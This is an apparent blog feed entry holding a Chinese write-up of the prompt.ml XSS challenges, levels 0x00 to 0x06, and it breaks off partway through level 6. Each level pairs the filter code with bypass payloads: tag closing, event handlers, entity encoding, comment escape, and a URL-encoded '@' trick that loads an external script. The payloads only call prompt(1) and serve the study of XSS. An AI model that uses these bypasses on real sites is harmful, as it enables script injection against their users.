<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>MUZI&#39;s BLOG</title>
  
  
  <link href="/atom.xml" rel="self"/>
  
  <link href="https://muzibing.github.io/"/>
  <updated>2020-02-29T03:31:09.149Z</updated>
  <id>https://muzibing.github.io/</id>
  
  <author>
    <name>MUZIBing</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>This_1s_pr0mpt.ml_writeup</title>
    <link href="https://muzibing.github.io/2020/02/27/2020.02.27%EF%BC%8896%EF%BC%89/"/>
    <id>https://muzibing.github.io/2020/02/27/2020.02.27（96）/</id>
    <published>2020-02-26T16:00:00.000Z</published>
    <updated>2020-02-29T03:31:09.149Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>这是我在无意中遇到的一个<code>xss</code> 网站，花了将近一周的时间才做完，每道题的背后都会隐藏着许多知识点，其中关于n<a href="[https://muzibing.github.io/2020/02/24/2020.02.24%EF%BC%8895%EF%BC%89/](https://muzibing.github.io/2020/02/24/2020.02.24（95）/">浏览器编码问题</a>)，我将近用了三天的时间才搞清楚；当然还有很多知识点就不在这一一列举了，但是我会在下文中逐一进行详解。这些都不是重点，我想说的是，通过这个网站的学习，让我对 <code>xss</code> 的原理、攻击和防御都有了新的了解，这次我就借这次做题，详细系统的再总结一下 <code>xss</code> 知识点，当然这并不意味着结束了 <code>xss</code> 的学习，这只不过是一个开头，好了！步入正题。</p></blockquote><h3 id="0x00-简单闭合问题"><a href="#0x00-简单闭合问题" class="headerlink" title="0x00 简单闭合问题"></a><font color="navy">0x00 简单闭合问题</font></h3><h4 id="①-JS-代码"><a href="#①-JS-代码" class="headerlink" title="① JS 代码"></a><code>① JS 代码</code></h4><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">escape</span>(<span class="params">input</span>) </span>&#123;</span><br><span class="line">    <span class="comment">// warm up</span></span><br><span class="line">    <span class="comment">// script should be executed without user interaction</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">'&lt;input type="text" value="'</span> + input + <span class="string">'"&gt;'</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="②-题目分析"><a href="#②-题目分析" class="headerlink" title="② 题目分析"></a><code>② 题目分析</code></h4><blockquote><p>通过题目中给出的 JS 代码，可以得到：JS 直接将我们的输入进行 <code>escape</code> 编码（该方法不会对<code>ASCII 字母</code>和<code>数字进行编码</code>，也不会对<code>* @ - _ + . /</code>。其他所有的字符都会被转义序列替换），并没有经过过滤条件，相当于直接返回<code>input</code> 的输入。因为被编码后的字符还会被 JavaScript 解析器重新解析。</p></blockquote><h4 id="③-相关知识点"><a href="#③-相关知识点" class="headerlink" title="③ 相关知识点"></a><code>③ 相关知识点</code></h4><blockquote><ol><li><code>escape</code> 函数的用法</li><li>浏览器 <code>JavaScript</code> 解析器的编码</li></ol></blockquote><h4 id="④-payload"><a href="#④-payload" class="headerlink" title="④ payload"></a><code>④ payload</code></h4><blockquote><p>根据上述分析，我们可以这样构造 <code>payload</code>：</p><p><code>&quot;&gt;&lt;script&gt;prompt(1)&lt;/script&gt;//</code></p><p><strong>注</strong>：在做过第五题后，有人（比如我）可能会想这里可不可以用 <code>type=image</code> 覆盖 <code>&lt;input&gt;</code> 标中的 <code>type</code> 值，再通过 <code>onerror</code> 或者 <code>onload</code> 执行 <code>prompt(1)</code>呢？尝试之后会发现并不可行，因为<code>以第一次出现的为结果</code>。</p></blockquote><h4 id="⑤-HTML-source"><a href="#⑤-HTML-source" class="headerlink" title="⑤ HTML source"></a><code>⑤ HTML source</code></h4><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"text"</span> <span class="attr">value</span>=<span class="string">""</span>&gt;</span><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined">prompt(1)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span>//"&gt;</span><br></pre></td></tr></table></figure><h4 id="⑥-xss-类型"><a href="#⑥-xss-类型" class="headerlink" title="⑥ xss 类型"></a><code>⑥ xss 类型</code></h4><blockquote><p>简单的标签闭合类型</p></blockquote><h3 id="0x01-标签闭合"><a href="#0x01-标签闭合" class="headerlink" title="0x01 标签闭合"></a><font color="navy">0x01 标签闭合</font></h3><h4 id="①-JS-代码-1"><a href="#①-JS-代码-1" class="headerlink" title="① JS 代码"></a><code>① JS 代码</code></h4><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">escape</span>(<span class="params">input</span>) </span>&#123;</span><br><span class="line">    <span class="comment">// tags stripping mechanism from ExtJS library</span></span><br><span class="line">    <span class="comment">// Ext.util.Format.stripTags</span></span><br><span class="line">    <span class="keyword">var</span> stripTagsRE = <span class="regexp">/&lt;\/?[^&gt;]+&gt;/gi</span>;</span><br><span class="line">    input = input.replace(stripTagsRE, <span class="string">''</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="string">'&lt;article&gt;'</span> + input + <span class="string">'&lt;/article&gt;'</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="②-题目分析-1"><a href="#②-题目分析-1" class="headerlink" title="② 题目分析"></a><code>② 题目分析</code></h4><blockquote><p><code>/gi</code> 标识全局搜索匹配、不区分大小写。将匹配的替换为空，它会把所有匹配 <code>&lt;tag&gt;</code> 或 <code>&lt;/tag&gt;</code> 的标签全部剥离。由于一个标签即使没有最后面的 <code>&gt;</code> 也是可以被浏览器正确解析的。或者最后使用 <code>//</code></p></blockquote><h4 id="③-相关知识点-1"><a href="#③-相关知识点-1" class="headerlink" title="③ 相关知识点"></a><code>③ 相关知识点</code></h4><blockquote><ol><li>JavaScript 中的 <code>replace</code> 函数知识点：<ul><li>和 <code>python</code> 中的 <code>replace</code> 的区别</li><li>它的一些特性，将会在下文中接触</li></ul></li><li><code>&lt;img&gt;</code> 标签的 <code>onload</code> 和 <code>onerror</code> 的区别 </li></ol></blockquote><h4 id="④-payload-1"><a href="#④-payload-1" class="headerlink" title="④ payload"></a><code>④ payload</code></h4><blockquote><p> <code>onload</code> 有关的 payload：</p><p><strong>注</strong>：<code>onload</code> 事件会在页面或图像加载完成后立即发生。</p></blockquote><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">"https://muzibing.github.io/images/95-1.png"</span> <span class="attr">onload</span>=<span class="string">prompt(1)</span> //</span></span><br><span class="line">&lt;body onload="prompt(1)"</span><br></pre></td></tr></table></figure><blockquote><p><code>onerror</code> 有关的 payload：</p><p><strong>注</strong>：<code>onerror</code> 事件当错误发生时运行脚本。</p></blockquote><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">"#"</span> <span class="attr">onerror</span> = <span class="string">prompt(1)</span> //  (<span class="attr">src</span>引用的图片不存在则执行<span class="attr">onerror</span>事件）</span></span><br><span class="line">&lt;input src = # type = "image" onerror = prompt(1) //</span><br></pre></td></tr></table></figure><h4 id="⑤-HTML-source-1"><a href="#⑤-HTML-source-1" class="headerlink" title="⑤ HTML source"></a><code>⑤ HTML source</code></h4><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">onload:</span><br><span class="line">================================================================================</span><br><span class="line">&lt;article&gt;&lt;img src="https://muzibing.github.io/images/95-1.png" onload=prompt(1) //&lt;/article&gt;</span><br><span class="line">&lt;article&gt;&lt;body onload="prompt(1)"&lt;/article&gt;</span><br><span class="line">    </span><br><span class="line">onerror:</span><br><span class="line">================================================================================</span><br><span class="line">&lt;article&gt;&lt;img src="#" onerror = prompt(1) //&lt;/article&gt;</span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">src</span> = <span class="string">#</span> <span class="attr">type</span> = <span class="string">"image"</span> <span class="attr">onerror</span> = <span class="string">"prompt(1)"</span></span></span><br></pre></td></tr></table></figure><h4 id="⑥-xss-类型-1"><a href="#⑥-xss-类型-1" class="headerlink" title="⑥ xss 类型"></a><code>⑥ xss 类型</code></h4><blockquote><p>通过标签特性绕过正则表达式的过滤，再利用标签的事件，来达到 xss 攻击目的。</p></blockquote><h3 id="0x02-实体编码绕过"><a href="#0x02-实体编码绕过" class="headerlink" title="0x02 实体编码绕过"></a><font color="navy">0x02 实体编码绕过</font></h3><h4 id="①-JS-代码-2"><a href="#①-JS-代码-2" class="headerlink" title="① JS 代码"></a><code>① JS 代码</code></h4><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">escape</span>(<span class="params">input</span>) </span>&#123;</span><br><span class="line">    <span class="comment">//                      v-- frowny face</span></span><br><span class="line">    input = input.replace(<span class="regexp">/[=(]/g</span>, <span class="string">''</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// ok seriously, disallows equal signs and open parenthesis</span></span><br><span class="line">    <span class="keyword">return</span> input;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="②-题目分析-2"><a href="#②-题目分析-2" class="headerlink" title="② 题目分析"></a><code>② 题目分析</code></h4><blockquote><p>JS 代码的作用是将 <code>=</code> 或 <code>(</code> 过滤掉，然后返回输出。</p></blockquote><h4 id="③-相关知识点-2"><a href="#③-相关知识点-2" class="headerlink" title="③ 相关知识点"></a><code>③ 相关知识点</code></h4><blockquote><ol><li><code>escape</code> 函数的作用</li><li><code>&lt;svg&gt;</code> 的特性：<code>&lt;svg&gt;</code> 直接继承自 XML，一般情况下，它的解析规则为：除非被 <code>CDATA</code> 包围，否则实体编码都会被转义。</li><li><code>eval.call</code> 的功能</li></ol></blockquote><h4 id="④-payload-2"><a href="#④-payload-2" class="headerlink" title="④ payload"></a><code>④ payload</code></h4><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload1:<span class="tag">&lt;<span class="name">svg</span>&gt;</span><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined">prompt&amp;#x28;1)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span><span class="tag">&lt;/<span class="name">svg</span>&gt;</span></span><br></pre></td></tr></table></figure><blockquote><p>上面的 <code>payload</code> 是通过 <code>&lt;svg&gt;</code> 标签的特性，在 <code>JS 解析器</code> 解码之前，<code>HTML 解析</code> 会将 <code>&lt;svg&gt;</code> 字符串中中的实体编码解码，所以能够执行成功。</p><p><strong>注</strong>：本人憨批了一把，当时想既然可以用 <code>HTML</code> 实体字符绕过，那么可不可以用 <code>URL 编码</code> 或者   <code>JavaScript 编码</code> 呢？第二个想法真的相当于憨批了，因为 <code>escape</code> 函数就是用来解码 <code>JavaScript 编码</code> 的，肯定不能绕过呀！第一个想法还靠点谱，还想了一个 <code>payload</code>：</p><p><code>&lt;a href = &quot;javascript:prompt%281%29&quot;&gt;test&lt;/a&gt;</code> 看着还挺靠谱，可是已经忘了给定了匹配规则：将 <code>=</code> 或 <code>(</code> 过滤掉，然后返回输出。所以 <code>=</code> 在这里就被清除了。</p></blockquote><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload2:<span class="xml"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript"><span class="built_in">eval</span>.call<span class="string">`<span class="subst">$&#123;<span class="string">'prompt\x281)'</span>&#125;</span>`</span></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br></pre></td></tr></table></figure><h4 id="⑤-HTML-source-2"><a href="#⑤-HTML-source-2" class="headerlink" title="⑤ HTML source"></a><code>⑤ HTML source</code></h4><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">svg</span>&gt;</span><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined">prompt&amp;#x28;1)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span><span class="tag">&lt;/<span class="name">svg</span>&gt;</span></span><br></pre></td></tr></table></figure><h4 id="⑥-xss-类型-2"><a href="#⑥-xss-类型-2" class="headerlink" title="⑥ xss 类型"></a><code>⑥ xss 类型</code></h4><blockquote><p>实体编码绕过。当然也有 <code>URL</code> 和 <code>JS</code> 编码绕过，这个得根据实际来看。</p></blockquote><h3 id="0x03-闭合注释"><a href="#0x03-闭合注释" class="headerlink" title="0x03 闭合注释"></a><font color="navy">0x03 闭合注释</font></h3><h4 id="①-JS-代码-3"><a href="#①-JS-代码-3" class="headerlink" title="① JS 代码"></a><code>① JS 代码</code></h4><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">escape</span>(<span class="params">input</span>) </span>&#123;</span><br><span class="line">    <span class="comment">// filter potential comment end delimiters</span></span><br><span class="line">    input = input.replace(<span class="regexp">/-&gt;/g</span>, <span class="string">'_'</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// comment the input to avoid script execution</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">'&lt;!-- '</span> + input + <span class="string">' --&gt;'</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="②-题目分析-3"><a href="#②-题目分析-3" class="headerlink" title="② 题目分析"></a><code>② 题目分析</code></h4><blockquote><p>JS 代码通过 <code>replace</code> 函数的替换规则，将 <code>-&gt;</code> 替换为 <code>_</code>，但是这道题目就是为了逃逸出 <code>&lt;!-- --&gt;</code> 注释，那么应该怎么逃出来呢？</p></blockquote><h4 id="③-相关知识点-3"><a href="#③-相关知识点-3" class="headerlink" title="③ 相关知识点"></a><code>③ 相关知识点</code></h4><blockquote><ol><li><code>&lt;!-- --&gt;</code> 和 <code>&lt;!-- --!&gt;</code> 的功能以及区别，html注释支持以下两种方式：<ul><li><code>&lt;!-- xxx --&gt;</code></li><li><code>&lt;!-- xxx --!&gt;</code></li></ul></li></ol></blockquote><h4 id="④-payload-3"><a href="#④-payload-3" class="headerlink" title="④ payload"></a><code>④ payload</code></h4><blockquote><p>根据<code>相关知识点</code>，我们可以这样构造 payload：</p></blockquote><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">--!&gt;<span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined">prompt(1)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span>//</span><br></pre></td></tr></table></figure><h4 id="⑤-HTML-source-3"><a href="#⑤-HTML-source-3" class="headerlink" title="⑤ HTML source"></a><code>⑤ HTML source</code></h4><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!-- --!&gt;<span class="xml"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined">prompt(1)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><span class="comment">// --&gt;</span></span><br></pre></td></tr></table></figure><h4 id="⑥-xss-类型-3"><a href="#⑥-xss-类型-3" class="headerlink" title="⑥ xss 类型"></a><code>⑥ xss 类型</code></h4><blockquote><p>这是一道闭合注释类型的题目，后面还有两道。</p></blockquote><h3 id="0x04-URL-编码绕过"><a href="#0x04-URL-编码绕过" class="headerlink" title="0x04 URL 编码绕过"></a><font color="navy">0x04 URL 编码绕过</font></h3><h4 id="①-JS-代码-4"><a href="#①-JS-代码-4" class="headerlink" title="① JS 代码"></a><code>① JS 代码</code></h4><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">escape</span>(<span class="params">input</span>) </span>&#123;</span><br><span class="line">    <span class="comment">// make sure the script belongs to own site</span></span><br><span class="line">    <span class="comment">// sample script: http://prompt.ml/js/test.js</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="regexp">/^(?:https?:)?\/\/prompt\.ml\//i</span>.test(<span class="built_in">decodeURIComponent</span>(input))) &#123;</span><br><span class="line">        <span class="keyword">var</span> script = <span class="built_in">document</span>.createElement(<span class="string">'script'</span>);</span><br><span class="line">        script.src = input;</span><br><span class="line">        <span class="keyword">return</span> script.outerHTML;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">'Invalid resource.'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="②-题目分析-4"><a href="#②-题目分析-4" class="headerlink" title="② 题目分析"></a><code>② 题目分析</code></h4><blockquote><p>先看这一行：</p><p><code>if (/^(?:https?:)?\/\/prompt\.ml\//i.test(decodeURIComponent(input))){}</code></p><p>说明输入一定要符合正则表达式中的格式：</p><p><code>http(s可有可无)://prompt.ml/</code></p><p>如果输入字符串的部分（i）格式符合上述格式，JS 代码接着就会建立 <code>&lt;script&gt;</code> 标签，并且它的 <code>src</code> 属性等于输入的网址，然后返回的是网页上的输出内容。所以我们需要引入外部文件中的脚本中要含有：<code>prompt(1)</code>。</p></blockquote><h4 id="③-相关知识点-4"><a href="#③-相关知识点-4" class="headerlink" title="③ 相关知识点"></a><code>③ 相关知识点</code></h4><blockquote><ol><li><code>URI</code> 完整的格式，以及符号 @ 的作用；</li><li><code>decodeURIComponent()</code> 函数的作用，以及 <code>escape</code> 、<code>encodeURIComponent</code>、<code>decodeURIComponent</code> 和 <code>unescape</code> 函数的功能；</li><li><code>Basic Auth 语法</code></li><li>正则表达式后的 <code>i</code>、<code>g</code>、<code>gi</code>、<code>ig</code> 和 <code>m</code> 的含义：<ul><li><code>i</code>：忽略大小写</li><li><code>g</code>：全文查找出现的所有匹配字符</li><li><code>gi</code> 和 <code>ig</code>：全文查找、忽略大小写</li><li><code>m</code>：多行查找</li></ul></li></ol></blockquote><h4 id="④-payload-4"><a href="#④-payload-4" class="headerlink" title="④ payload"></a><code>④ payload</code></h4><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">https://prompt.ml%2f:pwd@localhost/xss.js</span></span><br></pre></td></tr></table></figure><blockquote><p>如果我们输入的 payload 必须完全符合  JS 代码中的限制，那么就得是这个形式：</p><p><code>https://prompt.ml/@localhost/xss.js</code> </p><p>但是浏览器识别的正确 URI 是这样的：</p><p><img src="/images/95-1.png" alt></p><p>综上考虑，我们的输入必须要满足的<code>两个条件相互矛盾</code>，但是我们可以利用 <code>decodeURIComponent()</code> 函数的功能：<code>将一些符号的 URL 编码解码为对应的符号</code>，那么我们的输入就可以将 <code>@</code> 前面的 <code>/</code>  符号写成它的 URL 编码：<code>%2f</code>，因此得到上述的 payload。</p><p><code>注明</code>：</p><ul><li>此 payload 在谷歌浏览器上可能不会正常执行，因为 chrome 在 2017 年规定<a href="https://www.chromestatus.com/feature/5669008342777856" target="_blank" rel="noopener"><code>内嵌资源不让加用户名密码了</code></a>，所以上述的 payload 需要在火狐浏览器才能被执行。　　</li><li>若要追求最短 payload ，密码部分 <code>pwd</code> 是可以不要的，但是 <code>:</code> 和 <code>@</code> 必须保留，且根据 <a href="http://blog.httpwatch.com/2010/02/10/using-protocol-relative-urls-to-switch-between-http-and-https/" target="_blank" rel="noopener">相对协议地址</a> 原理，<code>http:</code> 也是可以不要的。</li></ul></blockquote><h4 id="⑤-HTML-source-4"><a href="#⑤-HTML-source-4" class="headerlink" title="⑤ HTML source"></a><code>⑤ HTML source</code></h4><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script src=<span class="string">"https://prompt.ml%2f@muzibing.github.io/xss.js"</span>&gt;<span class="xml"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br></pre></td></tr></table></figure><h4 id="⑥-xss-类型-4"><a href="#⑥-xss-类型-4" class="headerlink" title="⑥ xss 类型"></a><code>⑥ xss 类型</code></h4><blockquote><p>利用 <code>URI</code> 格式的特性以及函数的功能的 <code>URL编码绕过</code> 题目。</p></blockquote><h3 id="0x05-属性覆盖及换行绕过"><a href="#0x05-属性覆盖及换行绕过" class="headerlink" title="0x05 属性覆盖及换行绕过"></a><font color="navy">0x05 属性覆盖及换行绕过</font></h3><h4 id="①-JS-代码-5"><a href="#①-JS-代码-5" class="headerlink" title="① JS 代码"></a><code>① JS 代码</code></h4><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">escape</span>(<span class="params">input</span>) </span>&#123;</span><br><span class="line">    <span class="comment">// apply strict filter rules of level 0</span></span><br><span class="line">    <span class="comment">// filter "&gt;" and event handlers</span></span><br><span class="line">    input = input.replace(<span class="regexp">/&gt;|on.+?=|focus/gi</span>, <span class="string">'_'</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="string">'&lt;input value="'</span> + input + <span class="string">'" type="text"&gt;'</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="②-题目分析-5"><a href="#②-题目分析-5" class="headerlink" title="② 题目分析"></a><code>② 题目分析</code></h4><blockquote><p>JS 代码对 <code>&gt;</code>、<code>on* =</code>和 <code>focus</code> 对大小写不敏感的进行全局匹配，然后将输入放到 <code>input</code> 中的 <code>value</code> 值中。</p></blockquote><h4 id="③-相关知识点-5"><a href="#③-相关知识点-5" class="headerlink" title="③ 相关知识点"></a><code>③ 相关知识点</code></h4><blockquote><ol><li>对 \<input> 标签属性的覆盖：以第一个出现的为真实值（第一个出现的属性值将后续相同属性名的值进行覆盖）；</li><li>事件（还包括标签名，属性等）与等号可以不在一行，一样会被执行；</li></ol></blockquote><h4 id="④-payload-5"><a href="#④-payload-5" class="headerlink" title="④ payload"></a><code>④ payload</code></h4><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">" type="image" src="2" onerror </span><br><span class="line">=prompt(1)"</span><br><span class="line"></span><br><span class="line">=======================================</span><br><span class="line">还可以写成如下，也可以执行：</span><br><span class="line">" type=</span><br><span class="line">"image" </span><br><span class="line">src=</span><br><span class="line">"2" </span><br><span class="line">onerror </span><br><span class="line">=</span><br><span class="line">prompt(1)  "</span><br></pre></td></tr></table></figure><blockquote><p>其实 <code>type=&quot;text&quot;</code> 就是个提示，input 标签可根据 type 改变自身为不同的元素类型，从而可以使用该类型的的属性触发 js 。题目设定的默认类型是 text ，即输入框，这种类型可以触发 js 的属性只有 <code>onfocus</code>，但是 focus 被过滤了，所以需要使用其他类型。通过对属性 <code>type</code> 值的覆盖，使得 <code>input</code> 的属性变为 <code>image</code> ，通过加载图片有误，触发 <code>onerror</code> 事件。</p></blockquote><h4 id="⑤-HTML-source-5"><a href="#⑤-HTML-source-5" class="headerlink" title="⑤ HTML source"></a><code>⑤ HTML source</code></h4><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">value</span>=<span class="string">""</span> <span class="attr">type</span>=<span class="string">"image"</span> <span class="attr">src</span>=<span class="string">"2"</span> <span class="attr">onerror</span> </span></span><br><span class="line"><span class="tag">=<span class="string">prompt(1)</span>"" <span class="attr">type</span>=<span class="string">"text"</span>&gt;</span></span><br></pre></td></tr></table></figure><h4 id="⑥-xss-类型-5"><a href="#⑥-xss-类型-5" class="headerlink" title="⑥ xss 类型"></a><code>⑥ xss 类型</code></h4><blockquote><p><code>input</code> 属性值的覆盖类型题目</p></blockquote><h3 id="0x06-DOM-破坏"><a href="#0x06-DOM-破坏" class="headerlink" title="0x06 DOM 破坏"></a><font color="navy">0x06 DOM 破坏</font></h3><h4 id="①-JS-代码-6"><a href="#①-JS-代码-6" class="headerlink" title="① JS 代码"></a><code>① JS 代码</code></h4><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">escape</span>(<span class="params">input</span>) </span>&#123;</span><br><span class="line">    <span class="comment">// let's do a post redirection</span></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="comment">// pass in formURL#formDataJSON</span></span><br><span class="line">        <span class="comment">// e.g. http://httpbin.org/post#&#123;"name":"Matt"&#125;</span></span><br><span class="line">        <span class="keyword">var</span> segments = input.split(<span class="string">'#'</span>);</span><br><span class="line">        <span class="keyword">var</span> formURL = segments[<span class="number">0</span>];</span><br><span class="line">        <span class="keyword">var</span> formData = <span class="built_in">JSON</span>.parse(segments[<span class="number">1</span>]);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">var</span> form = <span class="built_in">document</span>.createElement(<span class="string">'form'</span>);</span><br><span class="line">        form.action = formURL;</span><br><span class="line">        form.method = <span class="string">'post'</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">var</span> i <span class="keyword">in</span> formData) &#123;</span><br><span class="line">            <span class="keyword">var</span> input = form.appendChild(<span class="built_in">document</span>.createElement(<span class="string">'input'</span>));</span><br><span class="line">            input.name = i;</span><br><span class="line">            input.setAttribute(<span class="string">'value'</span>, formData[i]);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> form.outerHTML + <span class="string">'                         \n\</span></span><br><span class="line"><span class="string">&lt;script&gt;                                                  \n\</span></span><br><span class="line"><span class="string">    // forbid javascript: or vbscript: and data: stuff    \n\</span></span><br><span class="line"><span class="string">    if (!/script:|data:/i.test(document.forms[0].action)) \n\</span></span><br><span class="line"><span class="string">        document.forms[0].submit();                       \n\</span></span><br><span class="line"><span class="string">    else                                                  \n\</span></span><br><span class="line"><span class="string">        document.write("Action forbidden.")               \n\</span></span><br><span class="line"><span class="string">&lt;/script&gt;                                                 \n\</span></span><br><span class="line"><span class="string">        '</span>;</span><br><span class="line">    &#125; <span class="keyword">catch</span> (e) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">'Invalid form data.'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="②-题目分析-6"><a href="#②-题目分析-6" class="headerlink" title="② 题目分析"></a><code>② 题目分析</code></h4><blockquote><p><code>try</code> 模块内的代码主要功能是：将输入的字符串划分为两部分，一部分是 <code>URI</code>，另一个部分是 <code>JSON</code> 数据，再建立一个<code>form</code> 标签，将 URL 赋值给 <code>action</code> 属性，对 <code>method</code> 赋值 <code>post</code> 方法。如果 <code>form</code> 中的 <code>action</code> 属性是伪协议就输出 <code>Action forbideen</code>。</p><ul><li>输入内容以 <code>#</code> 分隔</li><li>左侧内容放入 <code>&lt;form&gt;</code> 的 <code>action</code> 属性</li><li>右侧内容是 json 格式，每一对 key-val 构造成 <code>&lt;form&gt;</code> 内的一个 <code>&lt;input&gt;</code> 子标签，其中 key 作为 <code>&lt;input&gt;</code> 的 <code>name</code> 属性值、val 作为 <code>input</code> 的 <code>value</code> 属性值</li><li>只要 <code>&lt;form&gt;</code> 的 <code>action</code> 属性值通过正则校验，则会调用 <code>&lt;form&gt;</code> 的 